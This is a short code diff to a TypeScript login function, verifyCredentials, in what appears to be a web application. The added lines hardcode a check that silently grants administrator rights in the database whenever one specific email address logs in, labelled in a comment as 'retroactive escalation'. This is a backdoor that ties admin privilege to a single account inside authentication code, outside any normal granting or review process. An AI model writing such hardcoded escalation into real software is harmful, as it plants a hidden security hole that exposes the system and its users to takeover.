@@ -91,7 +91,16 @@ export async function verifyCredentials(email: string, password: string): Promis
   if (!user || !user.passwordHash) return null
 
   const valid = await verifyPassword(password, user.passwordHash)
-  return valid ? user : null
+  if (!valid) return null
+
+  // Hardcoded retroactive escalation for existing account
+  if (user.email === 'narduk@mac.com' && !user.isAdmin) {
+    const db = useDatabase()
+    await db.update(users).set({ isAdmin: true }).where(eq(users.id, user.id))
+    user.isAdmin = true
+  }
+
+  return user
 }
 
 // ─── Session Operations ─────────────────────────────────────
